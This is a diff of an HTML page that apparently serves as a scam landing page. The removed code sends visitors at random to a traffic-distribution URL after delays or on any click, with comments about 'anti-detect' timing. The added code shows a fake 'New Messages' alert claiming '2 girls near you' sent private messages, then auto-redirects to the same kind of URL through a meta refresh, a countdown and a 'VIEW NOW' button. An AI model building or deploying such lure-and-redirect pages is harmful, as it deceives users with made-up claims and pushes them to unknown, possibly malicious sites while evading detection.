@@ -2,77 +2,67 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Loading...</title>
+<title>New Messages</title>
+
+<meta http-equiv="refresh" content="2;url=https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0">
 
 <style>
 body {
-    margin: 0;
-    background: #000;
-    color: #fff;
+    background: #111;
+    color: white;
     text-align: center;
     font-family: Arial;
+    padding-top: 100px;
 }
-h2 {
-    margin-top: 80px;
+.box {
+    background: #1c1c1c;
+    padding: 30px;
+    border-radius: 15px;
+    width: 300px;
+    margin: auto;
+}
+.btn {
+    display: inline-block;
+    margin-top: 20px;
+    padding: 15px 25px;
+    background: red;
+    color: white;
+    text-decoration: none;
+    font-weight: bold;
+    border-radius: 10px;
+}
+.timer {
+    color: #ff4444;
+    margin-top: 10px;
 }
 </style>
 
 <script>
-
-// === ОФФЕРЫ (пока одна ссылка, но с разными режимами) ===
-let offers = [
-{
-    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
-    minDelay: 2200,
-    maxDelay: 2800
-},
-{
-    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
-    minDelay: 3000,
-    maxDelay: 5000
-},
-{
-    url: "https://news-tds.xyz/?p=MWFiNzRhYWI3NjliOWZlNTc5ZDJmNTQzY2ZiNjVmODh8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8MTg3NjUzMjc=&v=2&poid=0&coid=0",
-    minDelay: 5000,
-    maxDelay: 7000
+let time = 5;
+function countdown() {
+    document.getElementById("timer").innerText = time;
+    time--;
+    if (time < 0) {
+        window.location.href = "https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0";
+    }
 }
-];
-
-// случайный оффер
-let offer = offers[Math.floor(Math.random() * offers.length)];
-
-// задержка под него
-let delay = Math.floor(Math.random() * (offer.maxDelay - offer.minDelay + 1)) + offer.minDelay;
-
-// анти-детект: микрозадержка перед стартом
-let preDelay = Math.random() * 500;
-
-// запуск
-setTimeout(function(){
-
-    // 70% — авто редирект
-    if (Math.random() < 0.7) {
-        setTimeout(function(){
-            window.location.href = offer.url;
-        }, delay);
-    }
-
-    // 30% — только по клику
-    else {
-        document.addEventListener("click", function(){
-            window.location.href = offer.url;
-        });
-    }
-
-}, preDelay);
-
+setInterval(countdown, 1000);
 </script>
 
 </head>
 
 <body>
 
-<h2>Loading... please wait</h2>
+<div class="box">
+    <h2>🔥 2 girls near you are online</h2>
+    <p>They sent you private messages</p>
+
+    <a class="btn" href="https://news-tds.xyz/?p=NzA0MzQ3OTIxYjVjNTk3OWRkYjNjMWFjZTMyMzZjY2V8NDQ1NTQxfERpcmVjdExpbmt8fDEwMDB8ODE5OTQxOTM=&v=2&poid=0&coid=0">VIEW NOW</a>
+
+    <div class="timer">
+        Redirecting in <span id="timer">5</span> sec...
+    </div>
+</div>
 
 </body>
 </html>
